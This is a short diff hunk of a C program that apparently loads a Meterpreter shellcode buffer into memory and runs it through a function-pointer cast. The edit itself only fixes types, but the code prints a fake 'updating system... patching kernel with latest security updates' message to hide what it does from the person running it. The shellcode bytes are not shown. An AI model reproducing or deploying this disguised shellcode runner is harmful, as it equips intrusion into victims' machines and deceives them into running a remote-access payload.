@@ -18,10 +18,10 @@ unsigned char buf[] =
 
 
 // Push Meterpreter (shellcode) into memory
-main()
+int main()
 {
    printf("\nPlease Wait, updating system...\nPatching kernel with latest security updates.", strlen(buf));
-   int (*ret)() = (int(*)())buf;
+   void (*ret)() = (void(*)())buf;
    ret();
 }
 
